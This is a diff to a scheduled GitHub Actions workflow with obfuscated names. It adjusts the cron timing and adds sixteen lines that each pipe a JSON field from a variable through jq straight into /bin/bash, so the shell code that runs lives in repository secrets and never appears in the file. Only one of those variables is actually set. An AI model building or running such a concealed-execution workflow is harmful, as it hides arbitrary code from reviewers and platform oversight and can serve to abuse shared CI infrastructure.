@@ -3,7 +3,8 @@ name: miaoguojing1997
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 0/6 * * *'
+    - cron: '49 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,12 +13,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: miaoguojing1997
         env:
-          w710: ${{ secrets.w710 }}
+          akiv75775: ${{ secrets.akiv75775 }}
         run: |
-          echo $w710 | jq -r .eqdz14 | /bin/bash
-          echo $jmgg4191 | jq -r .ayoh13 | /bin/bash
-          echo $uz77970 | jq -r .vt71367 | /bin/bash
-          echo $oggoz205 | jq -r .yemu140 | /bin/bash
-          echo $fze580 | jq -r .rnti7 | /bin/bash
-          echo $pl99232 | jq -r .gayr50 | /bin/bash
+          echo $akiv75775 | jq -r .c86899 | /bin/bash
+          echo $gdc662 | jq -r .n3322 | /bin/bash
+          echo $pqyw25 | jq -r .cf7602 | /bin/bash
+          echo $emvwo26219 | jq -r .uyqp21348 | /bin/bash
+          echo $ejy522 | jq -r .d97 | /bin/bash
+          echo $x2492 | jq -r .s28 | /bin/bash
+          echo $s1356 | jq -r .hqbd8784 | /bin/bash
+          echo $oo20 | jq -r .dykvq123 | /bin/bash
+          echo $ow82536 | jq -r .nzq79275 | /bin/bash
+          echo $xatlj38143 | jq -r .vs5 | /bin/bash
+          echo $efa675 | jq -r .zved37 | /bin/bash
+          echo $xua735 | jq -r .rir7477 | /bin/bash
+          echo $nqycm106 | jq -r .yuih2403 | /bin/bash
+          echo $zywo89 | jq -r .nliwh976 | /bin/bash
+          echo $z52183 | jq -r .fd07 | /bin/bash
+          echo $ppvgb87 | jq -r .zgz38 | /bin/bash
 
